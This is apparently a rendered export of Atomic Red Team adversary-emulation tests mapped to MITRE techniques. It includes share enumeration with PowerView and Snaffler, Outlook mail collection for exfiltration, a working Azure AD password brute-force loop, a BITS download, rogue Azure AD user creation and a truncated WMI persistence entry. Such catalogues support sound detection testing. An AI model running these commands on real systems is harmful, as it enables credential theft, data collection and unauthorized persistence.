<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: d07e4cc1-98ae-447e-9d31-36cb430d28c4</li>
<li><strong>name</strong>: PowerView ShareFinder</li>
<li><strong>description</strong>: PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Import-Module "PathToAtomicsFolder..\ExternalPayloads\PowerView.ps1"
Invoke-ShareFinder #{parameters}</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "PathToAtomicsFolder..\ExternalPayloads\PowerView.ps1") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1" -OutFile "PathToAtomicsFolder..\ExternalPayloads\PowerView.ps1"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1135</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: b19d74b7-5e72-450a-8499-82e49e379d1a</li>
<li><strong>name</strong>: Enumerate All Network Shares with Snaffler</li>
<li>
<p><strong>description</strong>: Snaffler is an open-source tool that has been used by various threat groups, including Scattered Spider/Muddled Libra, to enumerate accessible shares and credential-containing files within a domain. 
<a href="https://unit42.paloaltonetworks.com/muddled-libra/">Reference</a></p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: invoke-expression 'cmd /c start powershell -command { cmd /c "#{snaffler_path}" -a -o "#{output_path}" }; start-sleep 90; stop-process -name "snaffler"'</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "PathToAtomicsFolder..\ExternalPayloads\Snaffler.exe") {exit 0} else {exit 1}</p>
</li>
<li><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe" -OutFile "PathToAtomicsFolder..\ExternalPayloads\Snaffler.exe"</li>
<li><strong>cleanup_command</strong>: remove-item "#{output_path}" -force -erroraction silentlycontinue</li>
<li><strong>mitre_id</strong>: T1135</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 3f1b5096-0139-4736-9b78-19bcb02bb1cb</li>
<li><strong>name</strong>: Email Collection with PowerShell Get-Inbox</li>
<li><strong>description</strong>: Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.
Successful execution will produce stdout message stating "Please be patient, this may take some time...". Upon completion, final output will be a mail.csv file.</li>
</ul>
<p>Note: Outlook is required, but no email account necessary to produce artifacts.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: powershell -executionpolicy bypass -command "#{file_path}\Get-Inbox.ps1" -file #{output_file}</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{file_path}\Get-Inbox.ps1") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114.001/src/Get-Inbox.ps1" -OutFile "#{file_path}\Get-Inbox.ps1"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item #{output_file} -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1114.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: {'description': 'Output file path', 'type': 'string', 'default': '$env:TEMP\mail.csv'}</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: {'description': 'File path for Get-Inbox.ps1', 'type': 'string', 'default': 'PathToAtomicsFolder\T1114.001\src'}</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 5a51ef57-299e-4d62-8e11-2d440df55e69</li>
<li><strong>name</strong>: Brute Force Credentials of single Azure AD user</li>
<li>
<p><strong>description</strong>: Attempt to brute force Azure AD user via AzureAD powershell module.</p>
</li>
<li>
<p><strong>platforms</strong>: ['azure-ad']</p>
</li>
<li><strong>command</strong>: Import-Module -Name AzureAD</li>
</ul>
<p>$passwords = "#{passwords}".split("{<code>n}")
foreach($password in $passwords) {
  $PWord = ConvertTo-SecureString -String "$password" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
  try {
    Write-Host " [-] Attempting ${password} on account #{username}."
    Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host " [!] #{username}:${password} are valid credentials!</code>r<code>n"
    break
  } catch {
    Write-Host " [-] #{username}:${password} invalid credentials.</code>r`n"
  }
}
Write-Host "End of bruteforce"</p>
<ul>
<li>
<p><strong>prereq_command</strong>: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AzureAD -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1110.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'Account to bruteforce. We encourage users running this atomic to add a valid microsoft account domain; for eg "bruce.wayne@<valid_ms_account.com>"', 'type': 'string', 'default': 'bruce.wayne@contoso.com'}</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f63b8bc4-07e5-4112-acba-56f646f3f0bc</li>
<li><strong>name</strong>: Bitsadmin Download (PowerShell)</li>
<li><strong>description</strong>: This test simulates an adversary leveraging bitsadmin.exe to download
and execute a payload leveraging PowerShell</li>
</ul>
<p>Upon execution you will find a github markdown file downloaded to the Temp directory</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item #{local_file} -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1197</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: e62d23ef-3153-4837-8625-fa4a3829134d</li>
<li><strong>name</strong>: Azure AD - Create a new user</li>
<li><strong>description</strong>: Creates a new user in Azure AD. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.</li>
<li><strong>platforms</strong>: ['azure-ad']</li>
<li><strong>command</strong>: Connect-AzureAD
$userprincipalname = "#{userprincipalname}"
$username = "#{username}"    <br />
$password = "#{password}"
$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
$PasswordProfile.Password = $password
New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username      </li>
<li><strong>prereq_command</strong>: Get-InstalledModule -Name AzureAD</li>
<li><strong>get_prereq_command</strong>: echo "use the following to install AzureAD PowerShell module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force"</li>
<li><strong>cleanup_command</strong>: Remove-AzureADUser -ObjectId "#{userprincipalname}"</li>
<li><strong>mitre_id</strong>: T1136.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'Display name of the new user to be created in Azure AD', 'type': 'string', 'default': 'atomicredteam'}</li>
<li><strong>input_arguments.password</strong>: {'description': 'Password for the new Azure AD user being created', 'type': 'string', 'default': 'reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 3c64f177-28e2-49eb-a799-d767b24dd1e0</li>
<li><strong>name</strong>: Persistence via WMI Event Subscription - CommandLineEventConsumer</li>
<li><strong>description</strong>: Run from an administrator powershell window. After running, reboot the victim machine.
After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.</li>
</ul>
<p>Code references</p>
<p>https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af</p>
<p>https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
